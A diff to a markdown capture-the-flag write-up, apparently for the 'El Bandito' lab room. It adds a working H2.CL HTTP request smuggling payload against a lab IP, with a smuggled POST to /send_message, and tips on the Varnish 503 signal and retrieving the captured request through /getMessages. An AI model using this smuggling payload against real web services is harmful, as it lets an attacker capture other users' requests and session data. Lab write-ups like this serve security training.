@@ -722,9 +722,44 @@ And we got a response:
     
     {"status":"Message received and stored successfully"}
     
-So it seems possible to downgrade the request, in this case we can try different [techiniques](https://portswigger.net/web-security/request-smuggling/advanced) to try to exploit this scenario. I started with H2.CL (in repeater remember to switch back to HTTP/2). 
+So it seems possible to downgrade the request, in this case we can try different [techiniques](https://portswigger.net/web-security/request-smuggling/advanced) to try to exploit this scenario. I started with H2.CL (in repeater remember to switch back to HTTP/2 and disable automatic content length update).
+At this point I was not able to proceed any further, so I took a look at the write up. The idea about how to get the finali flag is really interesting and I suggest to read these write up eventually. I will report only the payload I used to get the second flag:
 
+    POST / HTTP/2
+    Host: 10.10.206.238:80
+    Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Zlyizw.BeLtv-KQblTOSedQR5YeRlKVS88
+    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
+    Content-Length: 0
     
+    POST /send_message HTTP/1.1
+    Host: 10.10.206.238:80
+    Cookie: session=eyJ1c2VybmFtZSI6ImhBY2tMSUVOIn0.Zlyizw.BeLtv-KQblTOSedQR5YeRlKVS88
+    Content-Length: 800
+    Content-Type: application/x-www-form-urlencoded
+    
+    data=
+
+Some notes in case the payload will not work:
+1. remember the double carriage return after data=
+2. you must get the 503 response from Varnish proxy that indicates that the payload worked:
+
+        HTTP/2 503 Service Unavailable
+        ....
+       Retry-After: 5
+       Age: 0
+       ... 
+        <title>503 Backend fetch failed</title>
+       ...
+3. After you get the error, to get the flag, wait 30 seconds and send the reguqest to read the messages:
+
+       GET /getMessages HTTP/2
+     You should get the flag inside the JSON response inside the JSON body
+4. You should try a couple of time to succeed, in case after 3 attempts you didn't get the flag try to restart El Bandito, in my case solved the problem.       
+
+
+
+
+
 
 
     
